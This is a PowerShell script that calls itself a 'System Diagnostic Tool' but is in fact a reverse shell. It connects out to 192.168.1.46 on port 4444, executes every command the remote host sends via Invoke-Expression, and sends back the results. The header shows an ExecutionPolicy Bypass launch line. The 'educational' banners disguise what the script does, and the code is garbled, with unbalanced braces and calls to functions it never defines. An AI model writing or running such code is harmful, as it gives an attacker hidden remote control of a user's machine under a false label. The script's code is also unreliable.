# Simple System Diagnostic - PowerShell Edition
# Run with: powershell -ExecutionPolicy Bypass -Command "& { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('file:///$PWD/Invoke-SystemDiagnostic.ps1') }"
# Or directly: powershell -ExecutionPolicy Bypass -File .\Invoke-SystemDiagnostic.ps1

# Configuration
$ServerHost = "192.168.1.46"
$ServerPort = 4444

# Generate session ID
$SessionId = -join ((1..8) | ForEach {[char]((65..90) + (97..122) + (48..57) | Get-Random)})

Write-Host "=" * 60 -ForegroundColor Cyan
Write-Host "System Diagnostic Tool v3.0 - PowerShell Edition" -ForegroundColor Cyan
Write-Host "Session ID: $SessionId" -ForegroundColor Cyan
Write-Host "Educational network diagnostic utility" -ForegroundColor Cyan
Write-Host "=" * 60 -ForegroundColor Cyan

Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Initializing network diagnostic..." -ForegroundColor Green
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Target: $ServerHost`:$ServerPort" -ForegroundColor Green

try {
    # Create TCP connection
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($ServerHost, $ServerPort)
    
    if ($client.Connected) {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Connection established!" -ForegroundColor Green
        
        # Setup stream communication
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        # Send initial messages
        $writer.WriteLine("System Diagnostic Tool v3.0 - PowerShell Edition")
        $writer.WriteLine("Network connectivity test completed")
        $writer.WriteLine("Ready for diagnostic commands")
        $writer.WriteLine("")
        
        # Get current directory
        $currentDir = Get-Location
        $writer.WriteLine("Base directory: $currentDir")
        $writer.Write("$currentDir> ")
            
            Write-DiagnosticLog "Entering diagnostic command loop..."
            
            # Enhanced diagnostic loop with persistent directory navigation
            while ($client.Connected) {
                try {
                    # Read diagnostic command from remote host
                    $command = $reader.ReadLine()
                    
                    if ($command -eq $null -or $command -eq "") {
                        break
                    }
                    
                    Write-DiagnosticLog "Executing diagnostic command: $command"
                    
                    # Handle exit commands
                    if ($command.ToLower() -in @("exit", "quit", "bye")) {
                        $writer.WriteLine("Diagnostic session terminated")
                        break
                    }
                    
                    # Handle directory navigation commands for system analysis
                    if ($command.ToLower().StartsWith("cd ")) {
                        try {
                            $newDir = $command.Substring(3).Trim()
                            
                            if ($newDir -eq "..") {
                                $newPath = Split-Path $currentDir -Parent
                            }
                            elseif ([System.IO.Path]::IsPathRooted($newDir)) {
                                $newPath = $newDir
                            }
                            else {
                                $newPath = Join-Path $currentDir $newDir
                            }
                            
                            if (Test-Path $newPath -PathType Container) {
                                Set-Location $newPath
                                $currentDir = Get-Location
                                $output = "Diagnostic directory changed to: $currentDir"
                            }
                            else {
                                $output = "Directory not found: $newPath"
                            }
                        }
                        catch {
                            $output = "Error changing directory: $($_.Exception.Message)"
                        }
                    }
                    # Handle current directory query
                    elseif ($command.ToLower() -eq "pwd") {
                        $output = $currentDir.ToString()
                    }
                    # Execute other diagnostic commands in current directory
                    else {
                        try {
                            # Change to current directory before executing command
                            Set-Location $currentDir
                            
                            # Execute command and capture output
                            $result = Invoke-Expression $command 2>&1 | Out-String
                            
                            if ([string]::IsNullOrWhiteSpace($result)) {
                                $output = "[Diagnostic complete - no output]"
                            }
                            else {
                                $output = $result.Trim()
                            }
                        }
                        catch {
                            $output = "[Diagnostic error: $($_.Exception.Message)]"
                        }
                    }
                    
                    # Send diagnostic results back to remote host
                    $writer.WriteLine($output)
                    $writer.Write("`r`n$currentDir> ")
                    
                }
                catch {
                    Write-DiagnosticLog "Diagnostic loop error: $($_.Exception.Message)"
                    break
                }
            }
            
            # Cleanup diagnostic session
            $writer.Close()
            $reader.Close()
            $stream.Close()
            $client.Close()
            
            Write-DiagnosticLog "Diagnostic session completed"
        }
        else {
            Write-DiagnosticLog "Failed to establish diagnostic connection"
        }
    }
    catch {
        Write-DiagnosticLog "Network diagnostic error: $($_.Exception.Message)"
    }
}

function Start-SystemHealthCheck {
    Write-DiagnosticLog "Performing system health check..."
    Write-DiagnosticLog "Checking network interfaces..."
    
    # Simulate diagnostic delay
    Start-Sleep -Seconds 2
    
    Write-DiagnosticLog "Network interface analysis complete"
    Write-DiagnosticLog "Initiating advanced diagnostic protocols..."
}

# Main execution
function Main {
    $sessionId = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 8 | ForEach-Object {[char]$_})
    
    Write-Host "=" * 60 -ForegroundColor Cyan
    Write-Host "System Diagnostic Tool v3.0 - PowerShell Edition" -ForegroundColor Cyan
    Write-Host "Session ID: $sessionId" -ForegroundColor Cyan
    Write-Host "Educational network diagnostic utility" -ForegroundColor Cyan
    Write-Host "Authorized testing and system analysis only" -ForegroundColor Cyan
    Write-Host "=" * 60 -ForegroundColor Cyan
    
    # Perform preliminary system health check
    Start-SystemHealthCheck
    
    # Start network diagnostic
    Invoke-NetworkDiagnostic -TargetHost $ServerHost -TargetPort $ServerPort
    
    Write-DiagnosticLog "Diagnostic session $sessionId completed"
}

# Execute main function
Main
